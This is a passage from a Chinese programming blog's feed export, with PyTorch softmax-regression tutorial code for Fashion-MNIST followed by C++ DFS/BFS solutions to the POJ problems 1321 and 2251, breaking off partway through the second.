class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> IPython <span class="hljs-keyword">import</span> display<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br><br><br>batch_size = <span class="hljs-number">256</span><br>train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)<span class="hljs-comment">#返回训练集和测试集的迭代器</span><br><br><span class="hljs-comment">#初始化模型的参数</span><br>num_inputs = <span class="hljs-number">784</span><br>num_outputs = <span class="hljs-number">10</span><br><span class="hljs-comment">#图片长和宽都为28，将图片展平，将它们视作长度为784的向量。因为数据集有10个类别，所以网络输出维度为10</span><br>W = torch.normal(<span class="hljs-number">0</span>, <span class="hljs-number">0.01</span>, size=(num_inputs, num_outputs), requires_grad=<span class="hljs-literal">True</span>)<br>b = torch.zeros(num_outputs, requires_grad=<span class="hljs-literal">True</span>)<span class="hljs-comment">#每个输出都要有一个偏移</span><br><br><span class="hljs-comment">#定义softmax操作</span><br><span class="hljs-comment">#给定一个矩阵，可以对行或者列进行求和</span><br>X = torch.tensor([[<span class="hljs-number">1.0</span>, <span class="hljs-number">2.0</span>, <span class="hljs-number">3.0</span>], [<span class="hljs-number">4.0</span>, <span class="hljs-number">5.0</span>, <span class="hljs-number">6.0</span>]])<br>X.<span class="hljs-built_in">sum</span>(<span class="hljs-number">0</span>, keepdim=<span class="hljs-literal">True</span>), X.<span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#实现softmax</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">softmax</span>(<span class="hljs-params">X</span>):<br>    X_exp = torch.exp(X)<span class="hljs-comment">#指数运算</span><br>    partition = X_exp.<span class="hljs-built_in">sum</span>(<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<span class="hljs-comment">#维度为1进行每行的求和</span><br>    <span class="hljs-keyword">return</span> X_exp / partition  <span class="hljs-comment"># 这里应用了广播机制</span><br><br><span class="hljs-comment">#实现softmax回归模型</span><br><span class="hljs-comment">#将X reshape成256*784的2D矩阵，再进行矩阵乘法，加上偏移，最后所有元素放进softmax里。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">net</span>(<span class="hljs-params">X</span>):<br>    <span class="hljs-keyword">return</span> softmax(torch.matmul(X.reshape((-<span class="hljs-number">1</span>, W.shape[<span class="hljs-number">0</span>])), W) + b)<br><br><span class="hljs-comment">#定义损失函数</span><br>y = torch.tensor([<span class="hljs-number">0</span>, <span class="hljs-number">2</span>])<br>y_hat = torch.tensor([[<span class="hljs-number">0.1</span>, <span class="hljs-number">0.3</span>, <span class="hljs-number">0.6</span>], [<span class="hljs-number">0.3</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">0.5</span>]])<br>y_hat[[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>], y]<br><br><span class="hljs-comment">#交叉熵损失函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cross_entropy</span>(<span class="hljs-params">y_hat, y</span>):<br>    <span class="hljs-keyword">return</span> - torch.log(y_hat[<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(y_hat)), y])<br><br>cross_entropy(y_hat, y)<br><br><span class="hljs-comment">#将预测类别与真实y元素进行比较</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算预测正确的数量。&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算在指定数据集上模型的精度。&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># 将模型设置为评估模式</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 正确预测数、预测总数</span><br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>        metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment">#Accumulator的实现</span><br><span class="hljs-comment">#创建了两个变量，分别用于存储正确预测的数量和预测的总数量</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;在`n`个变量上累加。&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br>    <br><span class="hljs-comment">#训练</span><br><span class="hljs-comment">#对数据迭代一次的逻辑</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_epoch_ch3</span>(<span class="hljs-params">net, train_iter, loss, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;训练模型一个迭代周期（定义见第3章）。&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 将模型设置为训练模式</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.train()<br>    <span class="hljs-comment"># 训练损失总和、训练准确度总和、样本数</span><br>    metric = Accumulator(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> train_iter:<br>        <span class="hljs-comment"># 计算梯度并更新参数</span><br>        y_hat = net(X)<br>        l = loss(y_hat, y)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(updater, torch.optim.Optimizer):<br>            <span class="hljs-comment"># 使用PyTorch内置的优化器和损失函数</span><br>            updater.zero_grad()<br>            l.backward()<br>            updater.step()<br>            metric.add(<span class="hljs-built_in">float</span>(l) * <span class="hljs-built_in">len</span>(y), accuracy(y_hat, y),<br>                       y.size().numel())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 使用定制的优化器和损失函数</span><br>            l.<span class="hljs-built_in">sum</span>().backward()<br>            updater(X.shape[<span class="hljs-number">0</span>])<br>            metric.add(<span class="hljs-built_in">float</span>(l.<span class="hljs-built_in">sum</span>()), accuracy(y_hat, y), y.numel())<br>    <span class="hljs-comment"># 返回训练损失和训练准确率</span><br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>], metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animator</span>:  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;在动画中绘制数据。&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, xlabel=<span class="hljs-literal">None</span>, ylabel=<span class="hljs-literal">None</span>, legend=<span class="hljs-literal">None</span>, xlim=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">                 ylim=<span class="hljs-literal">None</span>, xscale=<span class="hljs-string">&#x27;linear&#x27;</span>, yscale=<span class="hljs-string">&#x27;linear&#x27;</span>,</span><br><span class="hljs-params">                 fmts=(<span class="hljs-params"><span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;m--&#x27;</span>, <span class="hljs-string">&#x27;g-.&#x27;</span>, <span class="hljs-string">&#x27;r:&#x27;</span></span>), nrows=<span class="hljs-number">1</span>, ncols=<span class="hljs-number">1</span>,</span><br><span class="hljs-params">                 figsize=(<span class="hljs-params"><span class="hljs-number">3.5</span>, <span class="hljs-number">2.5</span></span>)</span>):<br>        <span class="hljs-comment"># 增量地绘制多条线</span><br>        <span class="hljs-keyword">if</span> legend <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            legend = []<br>        d2l.use_svg_display()<br>        self.fig, self.axes = d2l.plt.subplots(nrows, ncols, figsize=figsize)<br>        <span class="hljs-keyword">if</span> nrows * ncols == <span class="hljs-number">1</span>:<br>            self.axes = [self.axes, ]<br>        <span class="hljs-comment"># 使用lambda函数捕获参数</span><br>        self.config_axes = <span class="hljs-keyword">lambda</span>: d2l.set_axes(<br>            self.axes[<span class="hljs-number">0</span>], xlabel, ylabel, xlim, ylim, xscale, yscale, legend)<br>        self.X, self.Y, self.fmts = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, fmts<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, x, y</span>):<br>        <span class="hljs-comment"># 向图表中添加多个数据点</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(y, <span class="hljs-string">&quot;__len__&quot;</span>):<br>            y = [y]<br>        n = <span class="hljs-built_in">len</span>(y)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(x, <span class="hljs-string">&quot;__len__&quot;</span>):<br>            x = [x] * n<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.X:<br>            self.X = [[] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.Y:<br>            self.Y = [[] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)]<br>        <span class="hljs-keyword">for</span> i, (a, b) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(x, y)):<br>            <span class="hljs-keyword">if</span> a <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> b <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                self.X[i].append(a)<br>                self.Y[i].append(b)<br>        self.axes[<span class="hljs-number">0</span>].cla()<br>        <span class="hljs-keyword">for</span> x, y, fmt <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.X, self.Y, self.fmts):<br>            self.axes[<span class="hljs-number">0</span>].plot(x, y, fmt)<br>        self.config_axes()<br>        display.display(self.fig)<br>        display.clear_output(wait=<span class="hljs-literal">True</span>)<br>        <br>        <br><span class="hljs-comment">#训练多个迭代周期        </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch3</span>(<span class="hljs-params">net, train_iter, test_iter, loss, num_epochs, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;训练模型（定义见第3章）。&quot;&quot;&quot;</span><br>    animator = Animator(xlabel=<span class="hljs-string">&#x27;epoch&#x27;</span>, xlim=[<span class="hljs-number">1</span>, num_epochs], ylim=[<span class="hljs-number">0.3</span>, <span class="hljs-number">0.9</span>],<br>                        legend=[<span class="hljs-string">&#x27;train loss&#x27;</span>, <span class="hljs-string">&#x27;train acc&#x27;</span>, <span class="hljs-string">&#x27;test acc&#x27;</span>])<br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        train_metrics = train_epoch_ch3(net, train_iter, loss, updater)<br>        test_acc = evaluate_accuracy(net, test_iter)<span class="hljs-comment">#在测试数据集上评估精度</span><br>        animator.add(epoch + <span class="hljs-number">1</span>, train_metrics + (test_acc,))<br>    train_loss, train_acc = train_metrics<br>    <span class="hljs-keyword">assert</span> train_loss &lt; <span class="hljs-number">0.5</span>, train_loss<br>    <span class="hljs-keyword">assert</span> train_acc &lt;= <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> train_acc &gt; <span class="hljs-number">0.7</span>, train_acc<br>    <span class="hljs-keyword">assert</span> test_acc &lt;= <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> test_acc &gt; <span class="hljs-number">0.7</span>, test_acc<br>    <br><span class="hljs-comment">#小批量梯度下降 </span><br>lr = <span class="hljs-number">0.1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">updater</span>(<span class="hljs-params">batch_size</span>):<br>    <span class="hljs-keyword">return</span> d2l.sgd([W, b], lr, batch_size)<br><br><span class="hljs-comment">#训练10个迭代周期</span><br>num_epochs = <span class="hljs-number">10</span><br>train_ch3(net, train_iter, test_iter, cross_entropy, num_epochs, updater)<br></code></pre></td></tr></table></figure><ul><li>借助softmax回归，我们可以训练多分类的模型。</li><li>softmax回归的训练循环与线性回归中的训练循环非常相似：读取数据、定义模型和损失函数，然后使用优化算法训练模型。正如你很快就会发现的那样，大多数常见的深度学习模型都有类似的训练过程。</li></ul><h5 id="softmax的简洁实现"><a href="#softmax的简洁实现" class="headerlink" title="softmax的简洁实现"></a>softmax的简洁实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> d2l <span class="hljs-keyword">import</span> torch <span class="hljs-keyword">as</span> d2l<br><br><br>batch_size = <span class="hljs-number">256</span><br>train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)<br><br><span class="hljs-comment">#初始化模型参数</span><br><span class="hljs-comment"># PyTorch不会隐式地调整输入的形状。因此，</span><br><span class="hljs-comment"># 我们在线性层前定义了展平层（flatten），来调整网络输入的形状</span><br>net = nn.Sequential(nn.Flatten(), nn.Linear(<span class="hljs-number">784</span>, <span class="hljs-number">10</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_weights</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(m) == nn.Linear:<br>        nn.init.normal_(m.weight, std=<span class="hljs-number">0.01</span>)<br><br>net.apply(init_weights);<br><br><span class="hljs-comment">#交叉熵</span><br>loss = nn.CrossEntropyLoss()<br><br><span class="hljs-comment">#优化算法</span><br>trainer = torch.optim.SGD(net.parameters(), lr=<span class="hljs-number">0.1</span>)<br><br><span class="hljs-comment">#训练</span><br>num_epochs = <span class="hljs-number">10</span><br>d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>搜索</title>
    <link href="/2021/09/07/%E6%90%9C%E7%B4%A2/"/>
    <url>/2021/09/07/%E6%90%9C%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<h4 id="棋盘问题：棋盘问题-POJ-1321-Virtual-Judge-vjudge-net"><a href="#棋盘问题：棋盘问题-POJ-1321-Virtual-Judge-vjudge-net" class="headerlink" title="棋盘问题：棋盘问题 - POJ 1321 - Virtual Judge (vjudge.net)"></a>棋盘问题：<a href="https://vjudge.net/problem/POJ-1321">棋盘问题 - POJ 1321 - Virtual Judge (vjudge.net)</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">char</span> a[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>]; <span class="hljs-comment">//记录棋盘位置</span><br><span class="hljs-type">bool</span> flag[<span class="hljs-number">10</span>];  <span class="hljs-comment">//记录一列是否已经放过棋子</span><br><span class="hljs-type">int</span> n, k; <br><span class="hljs-type">int</span> ans, cnt; <span class="hljs-comment">//ans 是放棋子的方案数 ，cnt是已放入棋盘的棋子数目</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DFS</span><span class="hljs-params">(<span class="hljs-type">int</span> row)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (cnt == k)<br>    &#123;<br>        ans++;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (row &gt;= n)<br>    &#123; <span class="hljs-comment">//边界条件</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (flag[i] == <span class="hljs-number">0</span> &amp;&amp; a[row][i] == <span class="hljs-string">&#x27;#&#x27;</span>)<br>        &#123;<br>            flag[i] = <span class="hljs-number">1</span>;<br>            cnt++;<br>            <span class="hljs-built_in">DFS</span>(row + <span class="hljs-number">1</span>);<br>            flag[i] = <span class="hljs-number">0</span>;<br>            cnt--;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">DFS</span>(row + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;n, &amp;k) &amp;&amp; n != <span class="hljs-number">-1</span> &amp;&amp; k != <span class="hljs-number">-1</span>) <span class="hljs-comment">//限制条件</span><br>    &#123;<br>        ans = <span class="hljs-number">0</span>;<br>        cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;a[i]);<br>        <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(flag));<br>        <span class="hljs-built_in">DFS</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, ans);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Dungeon-Master-Dungeon-Master-POJ-2251-Virtual-Judge-vjudge-net"><a href="#Dungeon-Master-Dungeon-Master-POJ-2251-Virtual-Judge-vjudge-net" class="headerlink" title="Dungeon Master :Dungeon Master - POJ 2251 - Virtual Judge (vjudge.net)"></a>Dungeon Master :<a href="https://vjudge.net/problem/POJ-2251">Dungeon Master - POJ 2251 - Virtual Judge (vjudge.net)</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;deque&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mod 1e9 + 7;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INF 0x3f3f3f3f</span><br><span class="hljs-type">int</span> sl, sx, sy;<br><span class="hljs-type">int</span> el, ex, ey;<br><span class="hljs-type">char</span> mp[<span class="hljs-number">35</span>][<span class="hljs-number">35</span>][<span class="hljs-number">35</span>];<br><span class="hljs-type">int</span> visited[<span class="hljs-number">35</span>][<span class="hljs-number">35</span>][<span class="hljs-number">35</span>];<br><span class="hljs-type">int</span> base[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] = &#123;&#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, 